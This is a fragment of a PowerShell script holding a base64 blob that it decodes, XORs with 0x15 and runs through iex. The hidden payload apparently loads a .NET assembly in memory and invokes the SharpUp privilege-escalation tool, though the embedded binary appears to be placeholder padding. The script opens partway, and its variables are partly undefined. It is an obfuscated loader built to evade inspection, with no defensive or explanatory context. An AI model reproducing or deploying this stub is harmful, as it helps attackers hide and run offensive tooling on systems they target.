VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFQoNxgfNTU1NTFHVEY1KDVORmxmYXB4O0dwc3lwdmF8ens7VGZmcHh3eWxILy9ZenRxPU5Wentj
cGdhSC8vU2d6eFd0ZnAjIUZhZ3x7cj0xd3RmcCMhd3x7dGdsPDwYHxgfNTU1NTFaeXFWentmenlw
WmBhNSg1TlZ6e2Z6eXBILy9aYGEYHzU1NTUxRmFnfHtyQmd8YXBnNSg1W3BiOFp3f3B2YTVcWjtG
YWd8e3JCZ3xhcGcYHzU1NTVOVnp7Znp5cEgvL0ZwYVpgYT0xRmFnfHtyQmd8YXBnPBgfGB81NTU1
TkZ9IWdlUWB4ZTtFZ3pyZ3R4SC8veHR8ez0xVnp4eHR7cTtGZXl8YT03NTc8PBgfGB81NTU1TlZ6
e2Z6eXBILy9GcGFaYGE9MVp5cVZ6e2Z6eXBaYGE8GB81NTU1MUdwZmB5YWY1KDUxRmFnfHtyQmd8
YXBnO0F6RmFnfHtyPTwYHzU1NTUxR3BmYHlhZhgfNTUYH2gYHw=="

$file = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($EncodedText))
$data = $enc.GetBytes($file)|%{$_-bXor0x15}
iex ([System.Text.Encoding]::ASCII.GetString($data))

